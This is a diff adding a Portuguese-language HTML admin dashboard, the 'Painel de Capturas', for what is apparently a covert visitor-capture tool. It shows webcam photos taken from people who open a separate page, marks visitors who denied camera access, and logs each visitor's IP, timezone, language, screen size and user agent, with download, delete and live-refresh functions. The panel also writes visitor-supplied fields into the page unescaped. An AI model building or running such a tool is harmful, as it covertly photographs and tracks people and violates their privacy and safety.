@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Painel Admin</title>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg:      #0a0a0a;
+      --surface: #111;
+      --border:  #1e1e1e;
+      --accent:  #6366f1;
+      --accent2: #8b5cf6;
+      --danger:  #ef4444;
+      --text:    #e5e5e5;
+      --muted:   #555;
+      --green:   #22c55e;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      font-size: 14px;
+      min-height: 100vh;
+    }
+
+    /* ===== LOGIN ===== */
+    #login-screen {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: radial-gradient(ellipse at center, #0f0f1e 0%, #0a0a0a 70%);
+    }
+
+    .login-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 40px;
+      width: 360px;
+      text-align: center;
+    }
+
+    .login-card .logo {
+      font-size: 40px;
+      margin-bottom: 16px;
+    }
+
+    .login-card h2 {
+      font-size: 1.3rem;
+      margin-bottom: 6px;
+    }
+
+    .login-card p {
+      color: var(--muted);
+      margin-bottom: 28px;
+      font-size: 0.85rem;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 16px;
+      background: #0d0d0d;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      color: var(--text);
+      font-size: 1rem;
+      margin-bottom: 16px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input[type="password"]:focus { border-color: var(--accent); }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 500;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .btn:hover  { opacity: 0.85; transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: #fff;
+      width: 100%;
+      padding: 12px;
+    }
+
+    .btn-danger { background: var(--danger); color: #fff; }
+    .btn-ghost  { background: transparent; color: var(--muted); border: 1px solid var(--border); }
+
+    .error-msg {
+      color: var(--danger);
+      font-size: 0.8rem;
+      margin-top: -8px;
+      margin-bottom: 12px;
+      min-height: 16px;
+    }
+
+    /* ===== DASHBOARD ===== */
+    #dashboard { display: none; }
+
+    /* Header */
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    header h1 {
+      font-size: 1.1rem;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      flex: 1;
+    }
+
+    header .badge {
+      background: #1a1a1a;
+      border: 1px solid var(--border);
+      padding: 4px 12px;
+      border-radius: 99px;
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    /* Stats */
+    .stats-row {
+      display: flex;
+      gap: 16px;
+      padding: 20px 24px 0;
+      flex-wrap: wrap;
+    }
+
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px 20px;
+      flex: 1;
+      min-width: 120px;
+    }
+
+    .stat-card .label {
+      font-size: 0.75rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    .stat-card .value {
+      font-size: 2rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    /* Toolbar */
+    .toolbar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 20px 24px;
+      flex-wrap: wrap;
+    }
+
+    .toolbar h2 {
+      font-size: 1rem;
+      flex: 1;
+    }
+
+    /* Grid de fotos */
+    #grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 16px;
+      padding: 0 24px 32px;
+    }
+
+    .photo-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      transition: border-color 0.2s, transform 0.15s;
+    }
+
+    .photo-card:hover {
+      border-color: var(--accent);
+      transform: translateY(-2px);
+    }
+
+    .photo-card img {
+      width: 100%;
+      aspect-ratio: 4/3;
+      object-fit: cover;
+      display: block;
+      background: #0d0d0d;
+      cursor: zoom-in;
+    }
+
+    .photo-card .no-cam {
+      width: 100%;
+      aspect-ratio: 4/3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0d0d0d;
+      color: var(--muted);
+      font-size: 2rem;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .photo-card .no-cam span {
+      font-size: 0.75rem;
+      color: #333;
+    }
+
+    .meta {
+      padding: 12px 14px;
+    }
+
+    .meta .time {
+      font-size: 0.8rem;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+
+    .meta .ip {
+      font-size: 0.75rem;
+      font-family: monospace;
+      color: var(--green);
+      background: #0a1a0a;
+      padding: 2px 8px;
+      border-radius: 4px;
+      display: inline-block;
+      margin-bottom: 8px;
+    }
+
+    .meta .extra {
+      font-size: 0.72rem;
+      color: #444;
+      line-height: 1.5;
+    }
+
+    .meta .actions {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .meta .actions .btn {
+      flex: 1;
+      font-size: 0.8rem;
+      padding: 8px 12px;
+    }
+
+    /* Empty */
+    #empty {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 80px 20px;
+      color: var(--muted);
+      gap: 12px;
+    }
+
+    #empty .icon { font-size: 48px; }
+
+    /* Loading */
+    #loading {
+      display: flex;
+      justify-content: center;
+      padding: 60px;
+    }
+
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid var(--border);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(6px);
+      z-index: 200;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-overlay.open { display: flex; }
+
+    .modal-overlay img {
+      max-width: 90vw;
+      max-height: 85vh;
+      border-radius: 12px;
+      box-shadow: 0 20px 80px rgba(0,0,0,0.8);
+    }
+
+    .modal-close {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      font-size: 1.2rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Pagination */
+    .pagination {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      padding: 0 24px 32px;
+    }
+
+    .pagination .btn { min-width: 80px; }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #1e1e1e;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px 20px;
+      font-size: 0.85rem;
+      z-index: 300;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 0.2s, transform 0.2s;
+      pointer-events: none;
+    }
+
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* Live dot */
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--green);
+      border-radius: 50%;
+      animation: pulse 2s ease-in-out infinite;
+      margin-right: 4px;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .live-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.78rem;
+      color: var(--green);
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="login-screen">
+  <div class="login-card">
+    <div class="logo">🔐</div>
+    <h2>Painel Admin</h2>
+    <p>Sistema de captura — acesso restrito</p>
+    <input type="password" id="pwd" placeholder="Senha de acesso" onkeydown="if(event.key==='Enter')login()">
+    <div class="error-msg" id="err"></div>
+    <button class="btn btn-primary" onclick="login()">Entrar</button>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard">
+  <header>
+    <h1>📷 Painel de Capturas</h1>
+    <div class="live-badge">
+      <div class="live-dot"></div>
+      AO VIVO
+    </div>
+    <button class="btn btn-ghost" onclick="logout()" style="margin-left:12px">Sair</button>
+  </header>
+
+  <!-- Stats -->
+  <div class="stats-row" id="stats-row">
+    <div class="stat-card">
+      <div class="label">Total</div>
+      <div class="value" id="stat-total">—</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Hoje</div>
+      <div class="value" id="stat-today">—</div>
+    </div>
+    <div class="stat-card" id="top-ip-card">
+      <div class="label">IP mais frequente</div>
+      <div class="value" id="stat-topip" style="font-size:1rem">—</div>
+    </div>
+  </div>
+
+  <!-- Toolbar -->
+  <div class="toolbar">
+    <h2>Capturas</h2>
+    <button class="btn btn-ghost" onclick="loadPage(currentPage)">↻ Atualizar</button>
+    <button class="btn btn-danger" onclick="deleteAll()">🗑 Apagar tudo</button>
+  </div>
+
+  <!-- Grid -->
+  <div id="loading"><div class="spinner"></div></div>
+  <div id="grid"></div>
+  <div id="empty">
+    <div class="icon">📭</div>
+    <p>Nenhuma captura ainda.</p>
+    <p style="font-size:0.8rem">Quando alguém acessar a página, as fotos aparecerão aqui.</p>
+  </div>
+
+  <!-- Paginação -->
+  <div class="pagination" id="pagination"></div>
+</div>
+
+<!-- Modal imagem -->
+<div class="modal-overlay" id="modal" onclick="closeModal()">
+  <button class="modal-close" onclick="closeModal()">✕</button>
+  <img id="modal-img" src="" alt="">
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+  let currentPage = 1;
+  let liveTimer   = null;
+
+  // ===== AUTH =====
+  async function login() {
+    const pwd = document.getElementById('pwd').value;
+    const err = document.getElementById('err');
+    err.textContent = '';
+
+    try {
+      const r = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: pwd })
+      });
+
+      if (r.ok) {
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        init();
+      } else {
+        err.textContent = 'Senha incorreta.';
+        document.getElementById('pwd').select();
+      }
+    } catch {
+      err.textContent = 'Erro de conexão.';
+    }
+  }
+
+  async function logout() {
+    await fetch('/api/logout', { method: 'POST' });
+    location.reload();
+  }
+
+  // Checa se já está autenticado
+  (async () => {
+    const r = await fetch('/api/me');
+    const d = await r.json();
+    if (d.authenticated) {
+      document.getElementById('login-screen').style.display = 'none';
+      document.getElementById('dashboard').style.display = 'block';
+      init();
+    }
+  })();
+
+  // ===== INIT =====
+  function init() {
+    loadStats();
+    loadPage(1);
+    // Atualização automática a cada 15s
+    liveTimer = setInterval(() => {
+      loadStats();
+      loadPage(currentPage, true);
+    }, 15000);
+  }
+
+  // ===== STATS =====
+  async function loadStats() {
+    try {
+      const r = await fetch('/api/stats');
+      if (!r.ok) return;
+      const d = await r.json();
+      document.getElementById('stat-total').textContent = d.total;
+      document.getElementById('stat-today').textContent = d.today;
+      document.getElementById('stat-topip').textContent =
+        d.topIPs.length ? `${d.topIPs[0].ip} (${d.topIPs[0].count}×)` : '—';
+    } catch {}
+  }
+
+  // ===== GRID =====
+  async function loadPage(page, silent = false) {
+    currentPage = page;
+    const grid    = document.getElementById('grid');
+    const empty   = document.getElementById('empty');
+    const loading = document.getElementById('loading');
+
+    if (!silent) {
+      grid.innerHTML    = '';
+      empty.style.display = 'none';
+      loading.style.display = 'flex';
+    }
+
+    try {
+      const r = await fetch(`/api/captures?page=${page}&limit=20`);
+      const d = await r.json();
+
+      loading.style.display = 'none';
+
+      if (d.total === 0) {
+        grid.innerHTML = '';
+        empty.style.display = 'flex';
+        document.getElementById('pagination').innerHTML = '';
+        return;
+      }
+
+      empty.style.display = 'none';
+      grid.innerHTML = d.items.map(c => cardHTML(c)).join('');
+      renderPagination(d.pages, page);
+
+    } catch {
+      loading.style.display = 'none';
+      toast('Erro ao carregar dados.', true);
+    }
+  }
+
+  function cardHTML(c) {
+    const date = new Date(c.timestamp);
+    const fmt  = date.toLocaleString('pt-BR');
+    const noCamera = c.meta && c.meta.noCamera;
+    const screen   = c.meta && c.meta.screen  ? c.meta.screen  : '';
+    const tz       = c.meta && c.meta.tz      ? c.meta.tz      : '';
+    const lang     = c.meta && c.meta.lang    ? c.meta.lang    : '';
+
+    const imgSection = noCamera
+      ? `<div class="no-cam">📷<span>Câmera negada</span></div>`
+      : `<img src="/uploads/${c.filename}" alt="Captura" onclick="openModal('/uploads/${c.filename}')" loading="lazy">`;
+
+    return `
+      <div class="photo-card" id="card-${c.id}">
+        ${imgSection}
+        <div class="meta">
+          <div class="time">🕐 ${fmt}</div>
+          <div class="ip">${c.ip}</div>
+          <div class="extra">
+            ${screen ? `📐 ${screen}` : ''}
+            ${lang ? ` &nbsp;🌐 ${lang}` : ''}
+            ${tz   ? `<br>🕹 ${tz}` : ''}
+            <br>🖥 ${truncate(c.userAgent, 60)}
+          </div>
+          <div class="actions">
+            ${!noCamera ? `<button class="btn btn-ghost" onclick="download('${c.id}')">⬇ Baixar</button>` : ''}
+            <button class="btn btn-danger" onclick="deleteOne('${c.id}')">🗑</button>
+          </div>
+        </div>
+      </div>`;
+  }
+
+  function truncate(str, n) {
+    return str.length > n ? str.slice(0, n) + '…' : str;
+  }
+
+  // ===== PAGINAÇÃO =====
+  function renderPagination(pages, current) {
+    if (pages <= 1) { document.getElementById('pagination').innerHTML = ''; return; }
+    let html = '';
+    if (current > 1)     html += `<button class="btn btn-ghost" onclick="loadPage(${current-1})">← Anterior</button>`;
+    html += `<span class="btn btn-ghost" style="cursor:default">${current} / ${pages}</span>`;
+    if (current < pages) html += `<button class="btn btn-ghost" onclick="loadPage(${current+1})">Próxima →</button>`;
+    document.getElementById('pagination').innerHTML = html;
+  }
+
+  // ===== AÇÕES =====
+  async function deleteOne(id) {
+    if (!confirm('Apagar esta captura?')) return;
+    const r = await fetch(`/api/captures/${id}`, { method: 'DELETE' });
+    if (r.ok) {
+      document.getElementById(`card-${id}`)?.remove();
+      loadStats();
+      toast('Captura apagada.');
+      if (!document.querySelector('.photo-card')) loadPage(currentPage);
+    }
+  }
+
+  async function deleteAll() {
+    if (!confirm('Apagar TODAS as capturas? Esta ação não pode ser desfeita.')) return;
+    const r = await fetch('/api/captures', { method: 'DELETE' });
+    if (r.ok) {
+      const d = await r.json();
+      loadStats();
+      loadPage(1);
+      toast(`${d.deleted} capturas apagadas.`);
+    }
+  }
+
+  function download(id) {
+    window.open(`/api/captures/${id}/download`, '_blank');
+  }
+
+  // ===== MODAL =====
+  function openModal(src) {
+    document.getElementById('modal-img').src = src;
+    document.getElementById('modal').classList.add('open');
+  }
+
+  function closeModal() {
+    document.getElementById('modal').classList.remove('open');
+    document.getElementById('modal-img').src = '';
+  }
+
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+  // ===== TOAST =====
+  function toast(msg, isError = false) {
+    const el = document.getElementById('toast');
+    el.textContent = msg;
+    el.style.borderColor = isError ? 'var(--danger)' : 'var(--border)';
+    el.classList.add('show');
+    setTimeout(() => el.classList.remove('show'), 3000);
+  }
+</script>
+
+</body>
+</html>
